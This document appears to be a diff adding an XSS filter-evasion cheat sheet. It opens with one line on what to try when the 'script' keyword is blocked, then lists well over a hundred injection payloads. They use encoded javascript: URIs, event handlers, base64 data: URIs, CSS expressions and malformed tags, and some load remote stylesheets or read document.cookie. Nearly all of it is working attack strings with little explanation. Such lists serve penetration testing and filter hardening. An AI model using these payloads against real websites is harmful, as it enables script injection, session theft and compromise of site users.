@@ -1,0 +1,311 @@
+When "script" keyword does not work during XSS attack.
+
+Then you can try these
+.............................
+<body/onload=&lt;!--&gt;&#10alert(1)>
+
+\u0061\u006C\u0065\u0072\u0074(~'\u0061')</script U+
+
+<object data=javascript&colon;\u0061&#x6C;&#101%72t(1)>
+
+src="data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%7
+3%63%72%69%70%74%3E"></iframe>
+
+<object data=data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+></object>
+<iframe
+
+<div style="position:absolute;top:0;left:0;width:100%;height:100%" onmouseover="prompt(1)"
+onclick="alert(1)">x</button>
+
+"><img src=x onerror=window.open('https://www.google.com/');>
+
+<svg><script>//&NewLine;confirm(1);</script </svg>
+
+<math><a xlink:href="//jsfiddle.net/t846h/">click
+
+<iframe
+src=j&NewLine;&Tab;a&NewLine;&Tab;&Tab;v&NewLine;&Tab;&Tab;&Tab;a&NewLine;&Tab;&Tab;
+&Tab;&Tab;s&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;c&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Ta
+b;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;i&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&T
+ab;&Tab;&Tab;p&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;
+&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&colon;a&NewLine;&Tab;&Tab;&Tab;&Tab;&
+Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;l&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;
+&Tab;&Tab;&Tab;&Tab;e&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Ta
+b;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&
+Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;
+&Tab;&Tab;28&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&T
+ab;&Tab;&Tab;&Tab;1&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;
+&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;%29></iframe>
+
+
+http://www.<script>alert(1)</script .com
+
+<input type="text" value=`` <div/onmouseover='alert(1)'>X</div>
+
+<iframe/onreadystatechange=alert(1)
+
+<img src="/" =_=" title="onerror='prompt(1)'">
+
+<var onmouseover="prompt(1)">On Mouse Over</var>
+
+
+<iframe srcdoc='&lt;body onload=prompt&lpar;1&rpar;&gt;'>
+
+<a href="javascript:void(0)" onmouseover=&NewLine;javascript:alert(1)&NewLine;>X</a>
+
+<script ~~~>alert(0%0)</script ~~~>
+
+<style/onload=&lt;!--&#09;&gt;&#10;alert&#10;&lpar;1&rpar;>
+
+<///style///><span %2F onmousemove='alert&lpar;1&rpar;'>SPAN
+
+<img/src='http://i.imgur.com/P8mL8.jpg' onmouseover=&Tab;prompt(1)
+&#34;&#62;<svg><style>{-o-link-source&colon;'
+<body/onload=confirm(1)>'
+
+&#13;<blink/&#13; onmouseover=pr&#x6F;mp&#116;(1)>OnMouseOver {Firefox & Opera}
+
+<marquee onstart='javascript:alert&#x28;1&#x29;'>^__^
+
+<div/style="width:expression(confirm(1))">X</div> {IE7}
+
+<iframe// src=javaSCRIPT&colon;alert(1)
+//<form/action=javascript&#x3A;alert&lpar;document&period;cookie&rpar;><input/type='submit'>
+
+<meta content="&NewLine; 1 &NewLine;; JAVASCRIPT&colon; alert(1)" http-equiv="refresh"/>
+
+<form><iframe &#09;&#10;&#11; src="javascript&#58;alert(1)"&#11;&#10;&#09;;>
+
+<A HREF="http://0102.0146.0007.00000223/">XSS</A>
+
+<iframe/src="data:text/html;&Tab;base64&Tab;,PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg==">
+
+
+<script /**/>/**/alert(1)/**/</script /**/
+
+<DIV STYLE="background-image: url(&#1;javascript:alert('XSS'))">
+
+<TABLE><TD BACKGROUND="javascript:alert('XSS')">
+
+<FRAMESET><FRAME SRC="javascript:alert('XSS');"></FRAMESET>
+
+<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html
+
+<BR SIZE="&{alert('XSS')}">
+
+<BGSOUND SRC="javascript:alert('XSS');">
+
+<LINK REL="stylesheet" HREF="http://ha.ckers.org/xss.css">
+
+<BR SIZE="&{alert('XSS')}">
+
+<BODY ONLOAD=alert('XSS')>
+
+<IMG SRC="livescript:[code]">
+
+<STYLE>@import'http://ha.ckers.org/xss.css';</STYLE>
+
+<INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');">
+
+<BODY BACKGROUND="javascript:alert('XSS')">
+
+<IMG DYNSRC="javascript:alert('XSS')">
+
+<IMG SRC=" &#14; javascript:alert('XSS');">
+
+<IMG
+SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x
+72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>
+
+';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";
+alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--
+></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
+
+<object onerror=javascript:javascript:alert(1)>
+
+<embed code=javascript:javascript:alert(1);></embed>
+
+<STYLE>@import'%(css)s';</STYLE>
+
+<STYLE type="text/css">BODY{background:url("javascript:javascript:alert(1)")}</STYLE>
+
+<TABLE BACKGROUND="javascript:javascript:alert(1)">
+
+<TABLE><TD BACKGROUND="javascript:javascript:alert(1)">
+
+<DIV STYLE="background-image: url(javascript:javascript:alert(1))">
+
+<DIV STYLE="width:expression(javascript:alert(1));">
+
+<IMG STYLE="xss:expr/*XSS*/ession(javascript:alert(1))">
+
+<LAYER SRC="%(scriptlet)s"></LAYER>
+
+<IMG SRC="javascript:javascript:alert(1)"
+<iframe src=%(scriptlet)s <
+
+<x style="behavior:url(%(sct)s)">
+<link rel=stylesheet href=data:,*%7bx:expression(javascript:alert(1))%7d
+
+<? foo="><script>javascript:alert(1)</script>">
+
+<embed src="data:text/html;base64,%(base64)s">
+
+<comment><img src="</comment><img src=x onerror=javascript:alert(1))//">
+
+<input onfocus=javascript:alert(1) autofocus>
+
+<input onblur=javascript:alert(1) autofocus><input autofocus>
+
+<script\x2F>javascript:alert(1)</script>
+
+<script\x20>javascript:alert(1)</script>
+
+<script\x0D>javascript:alert(1)</script>
+
+<script\x0A>javascript:alert(1)</script>
+
+
+"`'><script>\xE2\x80\x8Ajavascript:alert(1)</script>
+
+"`'><script>\xE1\x9A\x80javascript:alert(1)</script>
+
+"`'><script>\x0Cjavascript:alert(1)</script>
+
+"`'><script>\x2Bjavascript:alert(1)</script>
+
+"`'><script>\xF0\x90\x96\x9Ajavascript:alert(1)</script>
+
+"`'><script>-javascript:alert(1)</script>
+
+"`'><script>\x0Ajavascript:alert(1)</script>
+
+"`'><script>\xE2\x80\xAFjavascript:alert(1)</script>
+
+"`'><script>\x7Ejavascript:alert(1)</script>
+
+"`'><script>\xE2\x80\x87javascript:alert(1)</script>
+
+"`'><script>\xE2\x81\x9Fjavascript:alert(1)</script>
+
+"`'><script>\xE2\x80\xA9javascript:alert(1)</script>
+
+"`'><script>\xC2\x85javascript:alert(1)</script>
+
+"`'><script>\xEF\xBF\xAEjavascript:alert(1)</script>
+
+"`'><script>\xE2\x80\x83javascript:alert(1)</script>
+
+"`'><script>\xE2\x80\x8Bjavascript:alert(1)</script>
+
+"`'><script>\xEF\xBF\xBEjavascript:alert(1)</script>
+
+"`'><script>\xE2\x80\x80javascript:alert(1)</script>
+
+<style></style\x3E<img src="about:blank" onerror=javascript:alert(1)//></style>
+
+<style></style\x0D<img src="about:blank" onerror=javascript:alert(1)//></style>
+
+<style></style\x09<img src="about:blank" onerror=javascript:alert(1)//></style>
+
+<style></style\x20<img src="about:blank" onerror=javascript:alert(1)//></style>
+
+<style></style\x0A<img src="about:blank" onerror=javascript:alert(1)//></style>
+
+"'`>ABC<div style="font-family:'foo'\x7Dx:expression(javascript:alert(1);/*';">DEF
+
+"'`>ABC<div style="font-family:'foo'\x3Bx:expression(javascript:alert(1);/*';">DEF
+
+<script>if("x\\xE1\x96\x89".length==2) { javascript:alert(1);}</script>
+
+<script>if("x\\xE0\xB9\x92".length==2) { javascript:alert(1);}</script>
+
+<script>if("x\\xEE\xA9\x93".length==2) { javascript:alert(1);}</script>
+
+'`"><\x3Cscript>javascript:alert(1)</script>
+
+'`"><\x00script>javascript:alert(1)</script>
+
+"'`><\x3Cimg src=xxx:x onerror=javascript:alert(1)>
+
+"'`><\x00img src=xxx:x onerror=javascript:alert(1)>
+
+<body onPageShow body onPageShow="javascript:javascript:alert(1)"></body onPageShow>
+
+<style onReadyStateChange style onReadyStateChange="javascript:javascript:alert(1)"></style
+onReadyStateChange>
+
+<frameset onFocus frameset onFocus="javascript:javascript:alert(1)"></frameset onFocus>
+
+<applet onError applet onError="javascript:javascript:alert(1)"></applet onError>
+
+
+<marquee onStart marquee onStart="javascript:javascript:alert(1)"></marquee onStart>
+
+<script onLoad script onLoad="javascript:javascript:alert(1)"></script onLoad>
+
+<html onMouseOver html onMouseOver="javascript:javascript:alert(1)"></html onMouseOver>
+
+<html onMouseEnter html onMouseEnter="javascript:parent.javascript:alert(1)"></html
+onMouseEnter>
+
+<body onBeforeUnload body onBeforeUnload="javascript:javascript:alert(1)"></body
+onBeforeUnload>
+
+<html onMouseDown html onMouseDown="javascript:javascript:alert(1)"></html onMouseDown>
+
+<marquee onScroll marquee onScroll="javascript:javascript:alert(1)"></marquee onScroll>
+
+<xml onPropertyChange xml onPropertyChange="javascript:javascript:alert(1)"></xml
+onPropertyChange>
+
+<frameset onBlur frameset onBlur="javascript:javascript:alert(1)"></frameset onBlur>
+
+<applet onReadyStateChange applet onReadyStateChange="javascript:javascript:alert(1)"></applet
+onReadyStateChange>
+
+<svg onUnload svg onUnload="javascript:javascript:alert(1)"></svg onUnload>
+
+<html onMouseOut html onMouseOut="javascript:javascript:alert(1)"></html onMouseOut>
+
+<body onMouseMove body onMouseMove="javascript:javascript:alert(1)"></body onMouseMove>
+
+<body onResize body onResize="javascript:javascript:alert(1)"></body onResize>
+
+<object onError object onError="javascript:javascript:alert(1)"></object onError>
+
+<body onPopState body onPopState="javascript:javascript:alert(1)"></body onPopState>
+
+<html onMouseMove html onMouseMove="javascript:javascript:alert(1)"></html onMouseMove>
+
+<applet onreadystatechange applet onreadystatechange="javascript:javascript:alert(1)"></applet
+onreadystatechange>
+
+<body onpagehide body onpagehide="javascript:javascript:alert(1)"></body onpagehide>
+
+<svg onunload svg onunload="javascript:javascript:alert(1)"></svg onunload>
+
+<applet onerror applet onerror="javascript:javascript:alert(1)"></applet onerror>
+
+<body onkeyup body onkeyup="javascript:javascript:alert(1)"></body onkeyup>
+
+<body onunload body onunload="javascript:javascript:alert(1)"></body onunload>
+
+<iframe onload iframe onload="javascript:javascript:alert(1)"></iframe onload>
+
+<body onload body onload="javascript:javascript:alert(1)"></body onload>
+
+<html onmouseover html onmouseover="javascript:javascript:alert(1)"></html onmouseover>
+
+<object onbeforeload object onbeforeload="javascript:javascript:alert(1)"></object onbeforeload>
+
+<body onbeforeunload body onbeforeunload="javascript:javascript:alert(1)"></body
+onbeforeunload>
+
+<body src=1 href=1 onerror="javascript:alert(1)"></body>
+
+
+
+
+
+
